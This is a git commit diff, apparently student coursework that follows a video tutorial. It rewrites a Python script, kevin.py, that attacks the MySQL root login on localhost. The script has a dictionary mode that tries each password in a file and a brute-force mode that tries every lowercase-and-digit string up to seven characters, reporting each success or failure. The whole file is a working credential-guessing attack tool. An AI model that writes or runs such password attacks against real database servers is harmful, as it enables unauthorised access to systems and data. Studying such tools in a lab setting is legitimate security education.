8f9a00035852342ea0b757f730b2275fd51bfec8
chi-wei-lien <lien2@purdue.edu>
2022-04-10 15:01:46 -0400

    make code the same as video

--- kevin.py
+++ kevin.py
@@ -1,53 +1,47 @@
-import sys
-import time
-import string
-import itertools
-import os
 import mysql.connector
-from mysql.connector import errorcode
+import sys
+import itertools
+import string
 
 
 try:
-  flags = sys.argv[1]
-  if flags == "-D":
+  flag = sys.argv[1]
+  if flag == "-D":
     filename = sys.argv[2]
-  elif flags == "-B":
-    password_max_length = int(sys.argv[2])
-except:
-  print("please enter the right command")
 
-if flags == "-D":
-  file = open(filename, 'r')
-  password_in_list = file.readline()
+    file = open(filename, 'r')
+    password = file.readline()
 
-  while password_in_list:
-    password_in_list = password_in_list.strip()
-    try:
-      conn = mysql.connector.connect(user='root', host='127.0.0.1', password=password_in_list)
-      print("[*] " + password_in_list + " |  success")
-      break
-    except mysql.connector.Error as err:
-      print("[*] " + password_in_list + " |  fail")
-      password_in_list = file.readline()
-      continue
 
-    
-
-  file.close()
-elif flags == "-B":
-  is_found = False
-  chars = string.ascii_lowercase + string.digits
-  for length in range(1,password_max_length):
-    for guess in itertools.product(chars, repeat=length):
-      guess = ''.join(guess)
+    while password:
+      password = password.strip()
       try:
-        conn = mysql.connector.connect(user='root', host='127.0.0.1', password=guess)
-        print("[*] " + guess + " |  success")
-        is_found = True
+        conn = mysql.connector.connect(user='root', host='127.0.0.1', password=password)
+        print("[*] " + password + " | succeed")
         break
-      except mysql.connector.Error as err:
-        print("[*] " + guess + " |  fail")
-        continue
-    if is_found:
-      break
+      except:
+        print("[*] " + password + " | failed")
+      password = file.readline()
+    
+    file.close()
+  elif flag == "-B":
+    password_char = string.ascii_lowercase + string.digits
+    is_end = False
+    for password_length in range(1, 8):
+      for guess in itertools.product(password_char, repeat=password_length):
+        guess = ''.join(guess)
+        try:
+          conn = mysql.connector.connect(user='root', host='127.0.0.1', password=guess)
+          print("[*] " + guess + " | succeed")
+          is_end = True
+          break
+        except KeyboardInterrupt:
+          is_end = True
+          break
+        except:
+          print("[*] " + guess + " | failed")
+      if is_end == True:
+        break
 
+except:
+  print("please type in the write arugments")
